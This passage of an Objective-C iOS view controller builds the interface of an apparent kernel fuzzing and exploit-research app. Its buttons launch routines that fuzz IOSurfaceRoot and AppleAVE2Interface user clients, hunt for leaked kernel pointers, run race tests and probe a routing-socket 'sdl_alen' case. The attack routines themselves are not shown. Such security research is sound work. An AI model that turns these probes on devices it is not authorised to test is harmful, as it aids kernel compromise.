    [NSLayoutConstraint activateConstraints:@[
        [_logSection.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:16.0],
        [_logSection.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-16.0]
    ]];
}

- (void)buildDock {
    _dock = [[UIView alloc] initWithFrame:CGRectZero];
    _dock.translatesAutoresizingMaskIntoConstraints = NO;
    _dock.backgroundColor = KRWColorA(36, 40, 49, 0.58);
    _dock.layer.cornerRadius = 26.0;
    _dock.layer.cornerCurve = kCACornerCurveContinuous;
    _dock.layer.borderWidth = 0.5;
    _dock.layer.borderColor = KRWColorA(255, 255, 255, 0.07).CGColor;
    _dock.layer.shadowColor = [UIColor blackColor].CGColor;
    _dock.layer.shadowOpacity = 0.36;
    _dock.layer.shadowRadius = 24.0;
    _dock.layer.shadowOffset = CGSizeMake(0, 10);
    [self.view addSubview:_dock];

    UIVisualEffectView *blur = [[UIVisualEffectView alloc] initWithEffect:
        [UIBlurEffect effectWithStyle:UIBlurEffectStyleSystemUltraThinMaterialDark]];
    blur.translatesAutoresizingMaskIntoConstraints = NO;
    blur.userInteractionEnabled = NO;
    blur.layer.cornerRadius = 26.0;
    blur.layer.cornerCurve = kCACornerCurveContinuous;
    blur.clipsToBounds = YES;
    [_dock addSubview:blur];
    [NSLayoutConstraint activateConstraints:@[
        [blur.leadingAnchor constraintEqualToAnchor:_dock.leadingAnchor],
        [blur.trailingAnchor constraintEqualToAnchor:_dock.trailingAnchor],
        [blur.topAnchor constraintEqualToAnchor:_dock.topAnchor],
        [blur.bottomAnchor constraintEqualToAnchor:_dock.bottomAnchor]
    ]];

    KRWActionButton *stop = [[KRWActionButton alloc]
        initWithTitle:@"STOP"
             subtitle:@"halt workers"
          iconContent:KRWSymbolIcon(@"stop.fill", KRWRed(), 13.0)
                 tint:KRWRed()
                style:KRWActionStyleDock];
    [stop addTarget:self action:@selector(onStop) forControlEvents:UIControlEventTouchUpInside];

    KRWActionButton *credits = [[KRWActionButton alloc]
        initWithTitle:@"CREDITS"
             subtitle:@"murk-sus"
          iconContent:KRWCreditsIcons(12.0)
                 tint:KRWAccent()
                style:KRWActionStyleDock];
    [credits addTarget:self action:@selector(onCredits) forControlEvents:UIControlEventTouchUpInside];

    [_dock addSubview:stop];
    [_dock addSubview:credits];

    [NSLayoutConstraint activateConstraints:@[
        [_dock.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:16.0],
        [_dock.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-16.0],
        [_dock.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor constant:-8.0],
        [_dock.heightAnchor constraintEqualToConstant:62.0],

        [stop.leadingAnchor constraintEqualToAnchor:_dock.leadingAnchor constant:6.0],
        [stop.topAnchor constraintEqualToAnchor:_dock.topAnchor constant:6.0],
        [stop.bottomAnchor constraintEqualToAnchor:_dock.bottomAnchor constant:-6.0],
        [stop.widthAnchor constraintEqualToAnchor:credits.widthAnchor],

        [credits.leadingAnchor constraintEqualToAnchor:stop.trailingAnchor constant:8.0],
        [credits.trailingAnchor constraintEqualToAnchor:_dock.trailingAnchor constant:-6.0],
        [credits.topAnchor constraintEqualToAnchor:_dock.topAnchor constant:6.0],
        [credits.bottomAnchor constraintEqualToAnchor:_dock.bottomAnchor constant:-6.0]
    ]];

    [_scroll.bottomAnchor constraintEqualToAnchor:_logSection.topAnchor constant:-10.0].active = YES;
    [_logSection.bottomAnchor constraintEqualToAnchor:_dock.topAnchor constant:-10.0].active = YES;
}

- (void)buildContent {
    [_content addArrangedSubview:[self statusSection]];
    [_content addArrangedSubview:[self safeSection]];
    [_content addArrangedSubview:[self fuzzSection]];
    [_content addArrangedSubview:[self kernelSection]];
    [_content addArrangedSubview:[self infoSection]];
}

#pragma mark content sections

- (UIView *)sectionHeaderWithTitle:(NSString *)title detail:(NSString *)detail {
    UIView *header = [[UIView alloc] initWithFrame:CGRectZero];
    header.translatesAutoresizingMaskIntoConstraints = NO;
    UILabel *left = KRWLabel(@"", KRWFont(UIFontTextStyleCaption1, 12.0,
                                          UIFontWeightBold, 14.0), KRWSub());
    left.attributedText = KRWTracked(title, left.font, KRWSub(), 0.9);
    UILabel *right = KRWLabel(detail, KRWFont(UIFontTextStyleCaption2, 9.5,
                                              UIFontWeightMedium, 11.5), KRWMute());
    right.textAlignment = NSTextAlignmentRight;
    [header addSubview:left];
    [header addSubview:right];
    [NSLayoutConstraint activateConstraints:@[
        [header.heightAnchor constraintEqualToConstant:18.0],
        [left.leadingAnchor constraintEqualToAnchor:header.leadingAnchor constant:6.0],
        [left.centerYAnchor constraintEqualToAnchor:header.centerYAnchor],
        [right.trailingAnchor constraintEqualToAnchor:header.trailingAnchor constant:-6.0],
        [right.centerYAnchor constraintEqualToAnchor:header.centerYAnchor],
        [right.leadingAnchor constraintGreaterThanOrEqualToAnchor:left.trailingAnchor constant:8.0]
    ]];
    return header;
}

- (UIStackView *)sectionWithTitle:(NSString *)title
                           detail:(NSString *)detail
                             card:(UIView *)card {
    UIStackView *section = [[UIStackView alloc] initWithArrangedSubviews:
        @[ [self sectionHeaderWithTitle:title detail:detail], card ]];
    section.translatesAutoresizingMaskIntoConstraints = NO;
    section.axis = UILayoutConstraintAxisVertical;
    section.alignment = UIStackViewAlignmentFill;
    section.spacing = 8.0;
    return section;
}

- (UIView *)statusSection {
    KRWCardView *card = [[KRWCardView alloc] initWithFrame:CGRectZero];
    UIView *pad = [[UIView alloc] initWithFrame:CGRectZero];
    pad.translatesAutoresizingMaskIntoConstraints = NO;
    [card addSubview:pad];

    UIView *phaseHeader = [[UIView alloc] initWithFrame:CGRectZero];
    phaseHeader.translatesAutoresizingMaskIntoConstraints = NO;
    KRWStatusDot *dot = [[KRWStatusDot alloc] initWithFrame:CGRectZero];
    [dot startPulse];
    UILabel *phaseTag = KRWLabel(@"", KRWFont(UIFontTextStyleCaption2, 9.5,
                                              UIFontWeightBold, 11.5), KRWMute());
    phaseTag.attributedText = KRWTracked(@"PHASE", phaseTag.font, KRWMute(), 1.0);
    [phaseHeader addSubview:dot];
    [phaseHeader addSubview:phaseTag];
    [NSLayoutConstraint activateConstraints:@[
        [phaseHeader.heightAnchor constraintEqualToConstant:12.0],
        [dot.leadingAnchor constraintEqualToAnchor:phaseHeader.leadingAnchor],
        [dot.centerYAnchor constraintEqualToAnchor:phaseHeader.centerYAnchor],
        [dot.widthAnchor constraintEqualToConstant:7.0],
        [dot.heightAnchor constraintEqualToConstant:7.0],
        [phaseTag.leadingAnchor constraintEqualToAnchor:dot.trailingAnchor constant:6.0],
        [phaseTag.centerYAnchor constraintEqualToAnchor:phaseHeader.centerYAnchor]
    ]];

    gPhaseLabel = KRWLabel(gPhase.length ? gPhase : @"idle",
        KRWFont(UIFontTextStyleTitle3, 17.0, UIFontWeightBold, 22.0), KRWText());
    gPhaseLabel.numberOfLines = 2;
    gPhaseLabel.lineBreakMode = NSLineBreakByTruncatingTail;
    gPhaseLabel.minimumScaleFactor = 0.82;
    gPhaseLabel.adjustsFontSizeToFitWidth = YES;
    gPhaseLabel.adjustsFontForContentSizeCategory = YES;

    UIView *paths = [[UIView alloc] initWithFrame:CGRectZero];
    paths.translatesAutoresizingMaskIntoConstraints = NO;

    UILabel *docsKey = KRWLabel(@"", KRWFont(UIFontTextStyleCaption2, 8.5,
                                             UIFontWeightBold, 10.5), KRWMute());
    docsKey.attributedText = KRWTracked(@"DOCS", docsKey.font, KRWMute(), 0.8);
    gPathLabel = KRWLabel(gRunDirDocs ?: @"FAILED (see error)",
        KRWMono(8.5, UIFontWeightRegular, 10.5), KRWSub());
    gPathLabel.numberOfLines = 2;
    gPathLabel.lineBreakMode = NSLineBreakByTruncatingMiddle;
    gPathLabel.adjustsFontForContentSizeCategory = YES;

    UILabel *tmpKey = KRWLabel(@"", KRWFont(UIFontTextStyleCaption2, 8.5,
                                            UIFontWeightBold, 10.5), KRWMute());
    tmpKey.attributedText = KRWTracked(@"TMP", tmpKey.font, KRWMute(), 0.8);
    UILabel *tmpPath = KRWLabel(gRunDirTemp ?: @"none",
        KRWMono(8.5, UIFontWeightRegular, 10.5), KRWSub());
    tmpPath.numberOfLines = 2;
    tmpPath.lineBreakMode = NSLineBreakByTruncatingMiddle;
    tmpPath.adjustsFontForContentSizeCategory = YES;

    [paths addSubview:docsKey];
    [paths addSubview:gPathLabel];
    [paths addSubview:tmpKey];
    [paths addSubview:tmpPath];

    gErrorLabel = KRWLabel(@"",
        KRWFont(UIFontTextStyleCaption2, 9.5, UIFontWeightMedium, 11.5),
        gRunSetupError ? KRWRed() : KRWGreen());
    gErrorLabel.numberOfLines = 2;
    gErrorLabel.lineBreakMode = NSLineBreakByTruncatingTail;
    gErrorLabel.adjustsFontForContentSizeCategory = YES;
    if (gRunSetupError) {
        gErrorLabel.text = gRunSetupError;
    } else {
        gErrorLabel.text = @"Run folders verified · 5 files in each";
    }

    UIStackView *stack = [[UIStackView alloc] initWithArrangedSubviews:
        @[ phaseHeader, gPhaseLabel, KRWSeparator(), paths, gErrorLabel ]];
    stack.translatesAutoresizingMaskIntoConstraints = NO;
    stack.axis = UILayoutConstraintAxisVertical;
    stack.alignment = UIStackViewAlignmentFill;
    stack.spacing = 9.0;
    [stack setCustomSpacing:4.0 afterView:phaseHeader];
    [stack setCustomSpacing:11.0 afterView:gPhaseLabel];
    [pad addSubview:stack];

    [NSLayoutConstraint activateConstraints:@[
        [pad.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:14.0],
        [pad.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-14.0],
        [pad.topAnchor constraintEqualToAnchor:card.topAnchor constant:13.0],
        [pad.bottomAnchor constraintEqualToAnchor:card.bottomAnchor constant:-13.0],
        [stack.leadingAnchor constraintEqualToAnchor:pad.leadingAnchor],
        [stack.trailingAnchor constraintEqualToAnchor:pad.trailingAnchor],
        [stack.topAnchor constraintEqualToAnchor:pad.topAnchor],
        [stack.bottomAnchor constraintEqualToAnchor:pad.bottomAnchor],

        [docsKey.leadingAnchor constraintEqualToAnchor:paths.leadingAnchor],
        [docsKey.widthAnchor constraintEqualToConstant:34.0],
        [docsKey.centerYAnchor constraintEqualToAnchor:gPathLabel.centerYAnchor],

        [gPathLabel.leadingAnchor constraintEqualToAnchor:docsKey.trailingAnchor constant:4.0],
        [gPathLabel.trailingAnchor constraintEqualToAnchor:paths.trailingAnchor],
        [gPathLabel.topAnchor constraintEqualToAnchor:paths.topAnchor],

        [tmpKey.leadingAnchor constraintEqualToAnchor:paths.leadingAnchor],
        [tmpKey.widthAnchor constraintEqualToConstant:34.0],
        [tmpKey.centerYAnchor constraintEqualToAnchor:tmpPath.centerYAnchor],

        [tmpPath.leadingAnchor constraintEqualToAnchor:tmpKey.trailingAnchor constant:4.0],
        [tmpPath.trailingAnchor constraintEqualToAnchor:paths.trailingAnchor],
        [tmpPath.topAnchor constraintEqualToAnchor:gPathLabel.bottomAnchor constant:5.0],
        [tmpPath.bottomAnchor constraintEqualToAnchor:paths.bottomAnchor]
    ]];

    return [self sectionWithTitle:@"SESSION" detail:@"per-run folder" card:card];
}

- (KRWActionButton *)actionButton:(NSString *)title
                         subtitle:(NSString *)subtitle
                           symbol:(NSString *)symbol
                             tint:(UIColor *)tint
                            style:(KRWActionStyle)style
                           action:(SEL)action {
    UIColor *iconTint = (style == KRWActionStylePrimary)
        ? KRWColor(30, 20, 48) : tint;
    KRWActionButton *button = [[KRWActionButton alloc]
        initWithTitle:title
             subtitle:subtitle
          iconContent:KRWSymbolIcon(symbol, iconTint, style == KRWActionStylePrimary ? 15.0 : 13.0)
                 tint:tint
                style:style];
    [button addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
    return button;
}

- (UIView *)safeSection {
    KRWCardView *card = [[KRWCardView alloc] initWithFrame:CGRectZero];
    UIView *pad = [[UIView alloc] initWithFrame:CGRectZero];
    pad.translatesAutoresizingMaskIntoConstraints = NO;
    [card addSubview:pad];

    KRWActionButton *run = [self actionButton:@"RUN SAFE"
                                     subtitle:@"baseline surface sweep"
                                       symbol:@"shield.lefthalf.filled"
                                         tint:KRWAccent()
                                        style:KRWActionStylePrimary
                                       action:@selector(onSafe)];
    [run.heightAnchor constraintEqualToConstant:64.0].active = YES;

    KRWActionButton *create = [self actionButton:@"CREATE"
                                        subtitle:@"sel0 chain"
                                          symbol:@"plus.square.fill"
                                            tint:KRWGreen()
                                           style:KRWActionStyleTile
                                          action:@selector(onCreate)];
    KRWActionButton *scan = [self actionButton:@"SCAN SEL"
                                      subtitle:@"selectors 0–12"
                                        symbol:@"magnifyingglass"
                                          tint:KRWTeal()
                                         style:KRWActionStyleTile
                                        action:@selector(onScan)];
    [create.heightAnchor constraintEqualToConstant:58.0].active = YES;
    [scan.heightAnchor constraintEqualToConstant:58.0].active = YES;

    UIStackView *row = [[UIStackView alloc] initWithArrangedSubviews:@[ create, scan ]];
    row.translatesAutoresizingMaskIntoConstraints = NO;
    row.axis = UILayoutConstraintAxisHorizontal;
    row.distribution = UIStackViewDistributionFillEqually;
    row.spacing = 8.0;

    UIStackView *stack = [[UIStackView alloc] initWithArrangedSubviews:@[ run, row ]];
    stack.translatesAutoresizingMaskIntoConstraints = NO;
    stack.axis = UILayoutConstraintAxisVertical;
    stack.spacing = 8.0;
    [pad addSubview:stack];
    [NSLayoutConstraint activateConstraints:@[
        [pad.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:10.0],
        [pad.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-10.0],
        [pad.topAnchor constraintEqualToAnchor:card.topAnchor constant:10.0],
        [pad.bottomAnchor constraintEqualToAnchor:card.bottomAnchor constant:-10.0],
        [stack.leadingAnchor constraintEqualToAnchor:pad.leadingAnchor],
        [stack.trailingAnchor constraintEqualToAnchor:pad.trailingAnchor],
        [stack.topAnchor constraintEqualToAnchor:pad.topAnchor],
        [stack.bottomAnchor constraintEqualToAnchor:pad.bottomAnchor]
    ]];
    return [self sectionWithTitle:@"SAFE" detail:@"3 actions" card:card];
}

- (UIView *)fuzzSection {
    KRWCardView *card = [[KRWCardView alloc] initWithFrame:CGRectZero];
    UIView *pad = [[UIView alloc] initWithFrame:CGRectZero];
    pad.translatesAutoresizingMaskIntoConstraints = NO;
    [card addSubview:pad];

    KRWActionButton *fuzz = [self actionButton:@"FUZZ 50k"
                                      subtitle:@"create fuzz"
                                        symbol:@"waveform.path.ecg"
                                          tint:KRWPink()
                                         style:KRWActionStyleTile
                                        action:@selector(onFuzz)];
    KRWActionButton *mutate = [self actionButton:@"MUTATE 100k"
                                         subtitle:@"sel0 mutations"
                                           symbol:@"shuffle"
                                             tint:KRWAccent()
                                            style:KRWActionStyleTile
                                           action:@selector(onMutate)];
    KRWActionButton *mutate2 = [self actionButton:@"MUTATE 200k"
                                          subtitle:@"long mutation run"
                                            symbol:@"shuffle"
                                              tint:KRWAccent()
                                             style:KRWActionStyleTile
                                            action:@selector(onMutate200k)];
    KRWActionButton *uc = [self actionButton:@"FUZZ UC"
                                     subtitle:@"user clients"
                                       symbol:@"cpu"
                                         tint:KRWBlue()
                                        style:KRWActionStyleTile
                                       action:@selector(onUc)];
    for (KRWActionButton *b in @[ fuzz, mutate, mutate2, uc ]) {
        [b.heightAnchor constraintEqualToConstant:58.0].active = YES;
    }

    UIStackView *r1 = [[UIStackView alloc] initWithArrangedSubviews:@[ fuzz, mutate ]];
    UIStackView *r2 = [[UIStackView alloc] initWithArrangedSubviews:@[ mutate2, uc ]];
    for (UIStackView *row in @[ r1, r2 ]) {
        row.translatesAutoresizingMaskIntoConstraints = NO;
        row.axis = UILayoutConstraintAxisHorizontal;
        row.distribution = UIStackViewDistributionFillEqually;
        row.spacing = 8.0;
    }
    UIStackView *stack = [[UIStackView alloc] initWithArrangedSubviews:@[ r1, r2 ]];
    stack.translatesAutoresizingMaskIntoConstraints = NO;
    stack.axis = UILayoutConstraintAxisVertical;
    stack.spacing = 8.0;
    [pad addSubview:stack];
    [NSLayoutConstraint activateConstraints:@[
        [pad.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:10.0],
        [pad.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-10.0],
        [pad.topAnchor constraintEqualToAnchor:card.topAnchor constant:10.0],
        [pad.bottomAnchor constraintEqualToAnchor:card.bottomAnchor constant:-10.0],
        [stack.leadingAnchor constraintEqualToAnchor:pad.leadingAnchor],
        [stack.trailingAnchor constraintEqualToAnchor:pad.trailingAnchor],
        [stack.topAnchor constraintEqualToAnchor:pad.topAnchor],
        [stack.bottomAnchor constraintEqualToAnchor:pad.bottomAnchor]
    ]];
    return [self sectionWithTitle:@"FUZZ" detail:@"4 actions" card:card];
}

- (UIView *)kernelSection {
    KRWCardView *card = [[KRWCardView alloc] initWithFrame:CGRectZero];
    UIView *pad = [[UIView alloc] initWithFrame:CGRectZero];
    pad.translatesAutoresizingMaskIntoConstraints = NO;
    [card addSubview:pad];

    KRWActionButton *aggr = [self actionButton:@"AGGR"
                                      subtitle:@"overflow configs"
                                        symbol:@"bolt.fill"
                                          tint:KRWAmber()
                                         style:KRWActionStyleTile
                                        action:@selector(onAggr)];
    KRWActionButton *race = [self actionButton:@"RACE 30s"
                                      subtitle:@"multi-thread"
                                        symbol:@"arrow.triangle.2.circlepath"
                                          tint:KRWTeal()
                                         style:KRWActionStyleTile
                                        action:@selector(onRace)];
    KRWActionButton *hard = [self actionButton:@"HARD"
                                      subtitle:@"matrix · struct shapes · 30s race"
                                        symbol:@"exclamationmark.triangle.fill"
                                          tint:KRWRed()
                                         style:KRWActionStyleDanger
                                        action:@selector(onHard)];
    KRWActionButton *leak = [self actionButton:@"LEAK"
                                      subtitle:@"sel10 ptr hunt"
                                        symbol:@"drop.fill"
                                          tint:KRWBlue()
                                         style:KRWActionStyleTile
                                        action:@selector(onLeak)];
    KRWActionButton *f1 = [self actionButton:@"F1"
                                    subtitle:@"sel0 wrap"
                                      symbol:@"flag.fill"
                                        tint:KRWAmber()
                                       style:KRWActionStyleTile
                                      action:@selector(onF1)];
    KRWActionButton *selscan = [self actionButton:@"SELSCAN"
                                        subtitle:@"all 60 selectors, exact ABI"
                                          symbol:@"list.bullet.rectangle"
                                            tint:KRWTeal()
                                           style:KRWActionStyleTile
                                          action:@selector(onSelscan)];
    KRWActionButton *gates = [self actionButton:@"GATES"
                                      subtitle:@"AGX/AVE2 client types 0-8"
                                        symbol:@"lock.rotation"
                                          tint:KRWBlue()
                                         style:KRWActionStyleTile
                                        action:@selector(onGates)];
    [aggr.heightAnchor constraintEqualToConstant:58.0].active = YES;
    [race.heightAnchor constraintEqualToConstant:58.0].active = YES;
    [hard.heightAnchor constraintEqualToConstant:64.0].active = YES;
    [leak.heightAnchor constraintEqualToConstant:58.0].active = YES;
    [f1.heightAnchor constraintEqualToConstant:58.0].active = YES;
    [selscan.heightAnchor constraintEqualToConstant:58.0].active = YES;
    [gates.heightAnchor constraintEqualToConstant:58.0].active = YES;

    UIStackView *r1 = [[UIStackView alloc] initWithArrangedSubviews:@[ aggr, race ]];
    UIStackView *r2 = [[UIStackView alloc] initWithArrangedSubviews:@[ leak, f1 ]];
    UIStackView *r3 = [[UIStackView alloc] initWithArrangedSubviews:@[ selscan, gates ]];
    KRWActionButton *route = [self actionButton:@"ROUTE 26.6"
                                      subtitle:@"RTM_ADD AF_LINK sdl_alen"
                                        symbol:@"arrow.triangle.branch"
                                          tint:KRWAmber()
                                         style:KRWActionStyleTile
                                        action:@selector(onRoute)];
    KRWActionButton *necp = [self actionButton:@"NECP"
                                     subtitle:@"necp_open reachability"
                                       symbol:@"dot.radiowaves.left.and.right"
                                         tint:KRWGreen()
                                        style:KRWActionStyleTile
                                       action:@selector(onNecp)];
    [route.heightAnchor constraintEqualToConstant:58.0].active = YES;
    [necp.heightAnchor constraintEqualToConstant:58.0].active = YES;
    UIStackView *r4 = [[UIStackView alloc] initWithArrangedSubviews:@[ route, necp ]];
    for (UIStackView *row in @[ r1, r2 ]) {
        row.translatesAutoresizingMaskIntoConstraints = NO;
        row.axis = UILayoutConstraintAxisHorizontal;
        row.distribution = UIStackViewDistributionFillEqually;
        row.spacing = 8.0;
    }
    UIStackView *stack = [[UIStackView alloc] initWithArrangedSubviews:@[ r1, hard, r2, r3, r4 ]];
    stack.translatesAutoresizingMaskIntoConstraints = NO;
    stack.axis = UILayoutConstraintAxisVertical;
    stack.spacing = 8.0;
    [pad addSubview:stack];
    [NSLayoutConstraint activateConstraints:@[
        [pad.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:10.0],
        [pad.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-10.0],
        [pad.topAnchor constraintEqualToAnchor:card.topAnchor constant:10.0],
        [pad.bottomAnchor constraintEqualToAnchor:card.bottomAnchor constant:-10.0],
        [stack.leadingAnchor constraintEqualToAnchor:pad.leadingAnchor],
        [stack.trailingAnchor constraintEqualToAnchor:pad.trailingAnchor],
        [stack.topAnchor constraintEqualToAnchor:pad.topAnchor],
        [stack.bottomAnchor constraintEqualToAnchor:pad.bottomAnchor]
    ]];
    return [self sectionWithTitle:@"KERNEL" detail:@"9 actions" card:card];
}

- (UIView *)infoSection {
    KRWCardView *card = [[KRWCardView alloc] initWithFrame:CGRectZero];
    UIView *pad = [[UIView alloc] initWithFrame:CGRectZero];
    pad.translatesAutoresizingMaskIntoConstraints = NO;
    [card addSubview:pad];

    KRWActionButton *credits = [[KRWActionButton alloc]
        initWithTitle:@"CREDITS"
             subtitle:@"murk-sus"
          iconContent:KRWCreditsIcons(12.0)
                 tint:KRWAccent()
                style:KRWActionStyleTile];
    [credits.heightAnchor constraintEqualToConstant:58.0].active = YES;
    [credits addTarget:self action:@selector(onCredits) forControlEvents:UIControlEventTouchUpInside];

    KRWActionButton *github = [[KRWActionButton alloc]
        initWithTitle:@"GitHub"
             subtitle:@"murk-sus  ·  github.com/murk-sus"
          iconContent:KRWGitHubIcon(14.0)
                 tint:KRWText()
                style:KRWActionStyleTile];
    [github.heightAnchor constraintEqualToConstant:54.0].active = YES;
    [github addTarget:self action:@selector(openGitHubURL) forControlEvents:UIControlEventTouchUpInside];

    KRWActionButton *telegram = [[KRWActionButton alloc]
        initWithTitle:@"Telegram"
             subtitle:@"murk-sus  ·  t.me/@asuka4scape_developer"
          iconContent:KRWSymbolIcon(@"paperplane.fill", KRWTelegramBlue(), 14.0)
                 tint:KRWTelegramBlue()
                style:KRWActionStyleTile];
    [telegram.heightAnchor constraintEqualToConstant:54.0].active = YES;
    [telegram addTarget:self action:@selector(openTelegramURL) forControlEvents:UIControlEventTouchUpInside];

    NSString *build = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"] ?: @"18";
    NSString *version = [NSString stringWithFormat:@"%@ (%@)", app_version(), build];
    KRWInfoRow *versionRow = [[KRWInfoRow alloc] initWithTitle:@"Version"
                                                         value:version
                                                      monoValue:NO];
    KRWInfoRow *buildRow = [[KRWInfoRow alloc] initWithTitle:@"Build"
                                                       value:build
                                                    monoValue:YES];
    KRWInfoRow *runRow = [[KRWInfoRow alloc] initWithTitle:@"Run"
                                                     value:gRunDir.lastPathComponent ?: @"none"
                                                  monoValue:YES];

    UIStackView *stack = [[UIStackView alloc] initWithArrangedSubviews:
        @[ credits, KRWSeparator(), github, KRWSeparator(), telegram,
           KRWSeparator(), versionRow, KRWSeparator(), buildRow,
           KRWSeparator(), runRow ]];
    stack.translatesAutoresizingMaskIntoConstraints = NO;
    stack.axis = UILayoutConstraintAxisVertical;
    stack.spacing = 0.0;
    [stack setCustomSpacing:10.0 afterView:credits];
    [stack setCustomSpacing:10.0 afterView:github];
    [stack setCustomSpacing:10.0 afterView:telegram];
    [stack setCustomSpacing:10.0 afterView:versionRow];
    [stack setCustomSpacing:10.0 afterView:buildRow];
    [pad addSubview:stack];
    [NSLayoutConstraint activateConstraints:@[
        [pad.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:10.0],
        [pad.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-10.0],
        [pad.topAnchor constraintEqualToAnchor:card.topAnchor constant:10.0],
        [pad.bottomAnchor constraintEqualToAnchor:card.bottomAnchor constant:-10.0],
        [stack.leadingAnchor constraintEqualToAnchor:pad.leadingAnchor],
        [stack.trailingAnchor constraintEqualToAnchor:pad.trailingAnchor],
        [stack.topAnchor constraintEqualToAnchor:pad.topAnchor],
        [stack.bottomAnchor constraintEqualToAnchor:pad.bottomAnchor]
    ]];
    _infoCard = card;
    return [self sectionWithTitle:@"INFO" detail:@"build 18" card:card];
}

#pragma mark layout / entrance

- (void)viewDidLayoutSubviews {
    [super viewDidLayoutSubviews];

    _backgroundGradient.frame = self.view.bounds;
    CGFloat w = CGRectGetWidth(self.view.bounds);
    CGFloat h = CGRectGetHeight(self.view.bounds);
    _glowGradient.frame = CGRectMake(w * 0.16, -h * 0.22, w * 1.05, h * 0.75);

    CGFloat safeHeight = h - self.view.safeAreaInsets.top - self.view.safeAreaInsets.bottom;
    CGFloat target = MAX(150.0, MIN(300.0, safeHeight * 0.30));
    if (fabs(_logHeight.constant - target) > 0.5) {
        _logHeight.constant = target;
    }
}

- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];

    if (!_didInitialLogScroll) {
        _didInitialLogScroll = YES;
        dispatch_async(dispatch_get_main_queue(), ^{
            [gView layoutIfNeeded];
            CGFloat bottom = gView.contentSize.height - CGRectGetHeight(gView.bounds) +
                             gView.contentInset.bottom;
            if (bottom < -gView.contentInset.top) bottom = -gView.contentInset.top;
            [gView setContentOffset:CGPointMake(0, bottom) animated:NO];
        });
    }

    if (_didFadeIn) return;
    _didFadeIn = YES;

    if (UIAccessibilityIsReduceMotionEnabled()) {
        _header.alpha = _scroll.alpha = _logSection.alpha = _dock.alpha = 1.0;
        return;
    }
    _header.transform = CGAffineTransformMakeTranslation(0, -8);
    _scroll.transform = CGAffineTransformMakeTranslation(0, 12);
    _logSection.transform = CGAffineTransformMakeTranslation(0, 16);
    _dock.transform = CGAffineTransformMakeTranslation(0, 18);

    [UIView animateWithDuration:0.55 delay:0.02 usingSpringWithDamping:0.9
          initialSpringVelocity:0.25
                        options:UIViewAnimationOptionAllowUserInteraction |
                                UIViewAnimationOptionBeginFromCurrentState
                     animations:^{
        _header.alpha = 1.0;
        _header.transform = CGAffineTransformIdentity;
        _scroll.alpha = 1.0;
        _scroll.transform = CGAffineTransformIdentity;
    } completion:nil];
    [UIView animateWithDuration:0.55 delay:0.10 usingSpringWithDamping:0.9
          initialSpringVelocity:0.25
                        options:UIViewAnimationOptionAllowUserInteraction |
                                UIViewAnimationOptionBeginFromCurrentState
                     animations:^{
        _logSection.alpha = 1.0;
        _logSection.transform = CGAffineTransformIdentity;
        _dock.alpha = 1.0;
        _dock.transform = CGAffineTransformIdentity;
    } completion:nil];
}

- (void)scrollToInfo {
    if (!_infoCard) return;
    CGRect rect = [_infoCard convertRect:_infoCard.bounds toView:_scroll];
    CGFloat maxY = MAX(0.0, _scroll.contentSize.height - _scroll.bounds.size.height);
    CGFloat y = MIN(MAX(0.0, CGRectGetMinY(rect) - 12.0), maxY);
    [_scroll setContentOffset:CGPointMake(0, y) animated:YES];
}

#pragma mark actions

- (void)onSafe { dispatch_async(dispatch_get_global_queue(0, 0), ^{ run_safe(); }); }
- (void)onAggr { dispatch_async(dispatch_get_global_queue(0, 0), ^{ test_aggressive(); }); }
- (void)onFuzz { dispatch_async(dispatch_get_global_queue(0, 0), ^{ fuzz_loop(50000); }); }
- (void)onStop {
    L(@"[STOP] requested (phase stays as-is)");
    gStop = 1;
    UIImpactFeedbackGenerator *feedback =
        [[UIImpactFeedbackGenerator alloc] initWithStyle:UIImpactFeedbackStyleMedium];
    [feedback impactOccurred];
}
- (void)onScan { dispatch_async(dispatch_get_global_queue(0, 0), ^{ scan_selectors(); }); }
- (void)onCreate { dispatch_async(dispatch_get_global_queue(0, 0), ^{ probe_create(); }); }
- (void)onMutate { dispatch_async(dispatch_get_global_queue(0, 0), ^{ mutate_loop(100000); }); }
- (void)onMutate200k { dispatch_async(dispatch_get_global_queue(0, 0), ^{ mutate_loop(200000); }); }
- (void)onHard { dispatch_async(dispatch_get_global_queue(0, 0), ^{ hard_loop(); }); }
- (void)onLeak { dispatch_async(dispatch_get_global_queue(0, 0), ^{ leak_loop(); }); }
- (void)onF1 { dispatch_async(dispatch_get_global_queue(0, 0), ^{ f1_loop(); }); }
- (void)onSelscan { dispatch_async(dispatch_get_global_queue(0, 0), ^{ selscan_loop(); }); }
- (void)onGates { dispatch_async(dispatch_get_global_queue(0, 0), ^{ gates_loop(); }); }
- (void)onRoute { dispatch_async(dispatch_get_global_queue(0, 0), ^{ route_loop(); }); }
- (void)onNecp { dispatch_async(dispatch_get_global_queue(0, 0), ^{ necp_loop(); }); }
- (void)onRace { dispatch_async(dispatch_get_global_queue(0, 0), ^{ race_loop(30); }); }
- (void)onUc {
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        uc_fuzz("IOSurfaceRoot", 200000);
        uc_fuzz("AppleAVE2Interface", 200000);
    });
}
- (void)onCredits {
    KRWCreditsVC *credits = [[KRWCreditsVC alloc] init];
    credits.modalPresentationStyle = UIModalPresentationOverFullScreen;
    credits.modalTransitionStyle = UIModalTransitionStyleCrossDissolve;
    [self presentViewController:credits animated:NO completion:nil];
}
- (void)openGitHubURL { KRWOpenURL(@"https://github.com/murk-sus"); }
- (void)openTelegramURL { KRWOpenURL(@"https://t.me/@asuka4scape_developer"); }
- (void)onCopyLog {
    [gLogLock lock];
    NSString *snapshot = [gLog copy] ?: @"";
